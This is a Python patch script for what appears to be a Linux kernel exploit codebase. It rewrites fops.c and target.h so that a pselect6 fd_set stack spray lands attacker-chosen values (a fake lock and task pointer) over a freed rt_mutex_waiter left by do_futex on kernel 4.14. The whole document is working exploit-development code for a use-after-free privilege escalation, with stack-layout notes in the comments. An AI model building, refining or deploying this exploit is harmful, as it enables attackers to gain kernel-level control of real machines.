#!/usr/bin/env python3
# 4.14 stack geometry: do_futex rt_waiter is at stack_fds word 12 for the
# pselect6 route (sys_pselect6 frame 0xa0; sys_select is ENOSYS on this kernel).
#
# waiter word -> global word (shift=12):
#   0..2   -> 12..14  = ex words 2,3,4        (user-controlled at entry)
#   3..7   -> 15..19  = res_in words 0..4     (res_in == in & ready)
#   8,9    -> 20,21   = res_out words 0,1     (== 0 for a timerfd; we want 0)
#
# task@word6 and lock@word7 therefore land in res_in and become controlled by
# mirroring them into the `in` bitmap words 3/4.
import re, sys

# ---- fops.c ----
p = 'src/core/fops.c'
s = open(p).read()

# 1) revert the __NR_select experiment if present
s = s.replace('#include <time.h>\n#ifndef __NR_select\n#define __NR_select 1067\n#endif',
              '#include <time.h>', 1)
s = re.sub(
    r'/\* sys_select \(nr 1067\).*?\*/\n\s*int ret = syscall\(__NR_select, PSELECT_ROUTE_NFDS, &in, &out, &ex, &timeout\);',
    'int ret = select(PSELECT_ROUTE_NFDS, &in, &out, &ex, &timeout);',
    s, count=1, flags=re.S)

# 2) generalised global-word placement (in/out/ex + res_in/res_out/res_ex mirror)
old = '''static int pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1:
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2:
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}'''
new = '''static int pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0) {
    return 0;
  }

  /* The kernel lays out bits = in|out|ex|res_in|res_out|res_ex, each
   * words_per_set longs.  do_select computes res_X = X & ready, so forcing
   * res_X word k means writing X word k (with those fds selected+ready).
   * On 4.14 the pselect6 route puts the freed rt_mutex_waiter at word 12:
   * task(6)/lock(7) land in res_in, prio(8)/deadline(9) in res_out. */
  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0: /* in */
    case 3: /* res_in  <- in  word k */
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1: /* out */
    case 4: /* res_out <- out word k */
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2: /* ex */
    case 5: /* res_ex  <- ex  word k */
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}'''
assert old in s, 'pselect_put_global_word not found'
s = s.replace(old, new, 1)

# 3) drop the shift=8-only hardcoded in[0..2] mirror (now handled generally)
old2 = '''  /* 4.14 geometry (shift=8): waiter base = stack_fds+0x40, so lock/prio/deadline
   * land at global words 15/16/17 = res_in bytes 120..144, PAST the 120-byte
   * in/out/ex window. res_in = in & ready, so mirror them into the 'in' set
   * words 0..2 (bytes 0..24, harmless, below the waiter) and rely on res_in. */
  if (compact) {
    fdset_put_word(in, 0, fake_lock);
    fdset_put_word(in, 1, 0);
    fdset_put_word(in, 2, 0);
  }

'''
assert old2 in s, 'shift=8 mirror block not found'
s = s.replace(old2, '', 1)
open(p, 'w').write(s)
print('patched fops.c (generalised res_* placement)')

# ---- target.h ----
p = 'src/core/target.h'
s = open(p).read()
old3 = '#define PSELECT_WAITER_WORD_SHIFT 0'
new3 = ('/* 4.14 pselect6 route: freed rt_mutex_waiter = stack_fds word 12\n'
        ' * (sys_pselect6 frame 0xa0, do_futex rt_waiter @ frame+0xd0). */\n'
        '#define PSELECT_WAITER_WORD_SHIFT 12')
assert old3 in s, 'target.h PSELECT_WAITER_WORD_SHIFT not found'
s = s.replace(old3, new3, 1)
open(p, 'w').write(s)
print('patched target.h (PSELECT_WAITER_WORD_SHIFT=12)')
